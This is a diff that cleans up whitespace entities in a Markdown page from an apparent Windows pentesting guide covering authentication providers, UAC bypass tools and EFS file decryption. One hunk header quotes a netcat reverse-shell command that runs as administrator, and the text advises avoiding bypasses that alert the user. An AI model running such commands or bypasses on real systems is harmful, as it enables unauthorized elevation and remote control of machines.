@@ -8,16 +8,16 @@ The SSPI will be in charge of finding the adequate protocol for two machines tha
 
 ### Main SSPs
 
-* **Kerberos**: The preferred one&#x20;
+* **Kerberos**: The preferred one
   * %windir%\Windows\System32\kerberos.dll
-* **NTLMv1** and **NTLMv2**: Compatibility reasons&#x20;
+* **NTLMv1** and **NTLMv2**: Compatibility reasons
   * %windir%\Windows\System32\msv1\_0.dll
-* **Digest**: Web servers and LDAP, password in form of a MD5 hash&#x20;
+* **Digest**: Web servers and LDAP, password in form of a MD5 hash
   * %windir%\Windows\System32\Wdigest.dll
-* **Schannel**: SSL and TLS&#x20;
+* **Schannel**: SSL and TLS
   * %windir%\Windows\System32\Schannel.dll
-* **Negotiate**: It is used to negotiate the protocol to use (Kerberos or NTLM being Kerberos the default one)&#x20;
-  * &#x20;%windir%\Windows\System32\lsasrv.dll
+* **Negotiate**: It is used to negotiate the protocol to use (Kerberos or NTLM being Kerberos the default one)
+  * %windir%\Windows\System32\lsasrv.dll
 
 #### The negotiation could offer several methods or only one.
 
@@ -149,9 +149,9 @@ Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10
 #### UAC bypass exploits
 
 You could also use some tools to **bypass UAC like** [**UACME** ](https://github.com/hfiref0x/UACME)which is a **compilation** of several UAC bypass exploits. Note that you will need to **compile UACME using visual studio or msbuild**. The compilation will create several executables (like_Source\Akagi\outout\x64\Debug\Akagi.exe_) , you will need to know **which one you need.**\
-****You should **be careful** because some bypasses will **prompt some other programs** that will **alert** the **user** that something is happening.
+You should **be careful** because some bypasses will **prompt some other programs** that will **alert** the **user** that something is happening.
 
-**Empire** and **Metasploit** also have several modules to **bypass** the **UAC**.&#x20;
+**Empire** and **Metasploit** also have several modules to **bypass** the **UAC**.
 
 #### More UAC bypass
 
@@ -182,9 +182,9 @@ Consists on watching if an **autoElevated binary** tries to **read** from the **
 
 EFS works by encrypting a file with a bulk **symmetric key**, also known as the File Encryption Key, or **FEK**.  The FEK is then **encrypted** with a **public key** that is associated with the user who encrypted the file, and this encrypted FEK is stored in the $EFS **alternative data stream** of the encrypted file. To decrypt the file, the EFS component driver uses the **private key** that matches the EFS digital certificate (used to encrypt the file) to decrypt the symmetric key that is stored in the $EFS stream. From [here](https://en.wikipedia.org/wiki/Encrypting\_File\_System).
 
-Examples of files being decrypted without the user asking for it:&#x20;
+Examples of files being decrypted without the user asking for it:
 
-* Files and folders are decrypted before being copied to a volume formatted with another file system, like [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table).&#x20;
+* Files and folders are decrypted before being copied to a volume formatted with another file system, like [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table).
 * Encrypted files are copied over the network using the SMB/CIFS protocol, the files are decrypted before they are sent over the network.
 
 The encrypted files using this method can be **tansparently access by the owner user** (the one who has encrypted them), so if you can **become that user** you can decrypt the files (changing the password of the user and logins as him won't work).
@@ -196,7 +196,7 @@ Check if a **user** has **used** this **service** checking if this path exists:`
 Check **who** has **access** to the file using cipher /c \<file>\
 You can also use `cipher /e` and `cipher /d` inside a folder to **encrypt** and **decrypt** all the files
 
-### Decrypting EFS files&#x20;
+### Decrypting EFS files
 
 #### Being Authority System
 
